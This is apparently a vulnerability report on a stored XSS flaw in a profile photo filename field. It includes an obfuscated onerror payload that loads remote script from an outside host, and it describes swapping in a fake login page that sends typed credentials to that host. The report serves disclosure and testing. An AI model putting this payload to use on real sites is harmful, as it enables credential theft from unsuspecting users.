# Vulnerability 11: Stored XSS in photo filename

- Vulnerability: Stored XSS
- Where: `photo` in `POST /update_profile`
- Impact: Allows to run any script in browser viewing any page with uploaded user photo

## Steps to reproduce

1. Register a new user (if you already have an user you can go to step 2)
2. Login as that user
3. Update profile using following value as `filename` for `photo`

```html
 onerror=s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,115,58,47,47,98,105,116,46,108,121,47,51,55,70,51,75,66,66);document.body.appendChild(s)
```

4. The filename will be used as part of HTML `<img src="./static/photos/l1cpn9ud_" onerror="s=document.[...].appendChild(s)" alt="" width="50" height="50">`
5. Viewing user's posts and profile causing execution of inserted `onerror` javascript.
5. Page edited by this javascript will load script via `https://bit.ly/37F3KBB` from `https://qwsk.000webhostapp.com/x.js`
6. This script than replaces viewed page with edited copy of login page.
7. Data that user inputs into attacker's version of login page are than send to `https://qwsk.000webhostapp.com/thx.php`.

[(POC)](vuln11.py)
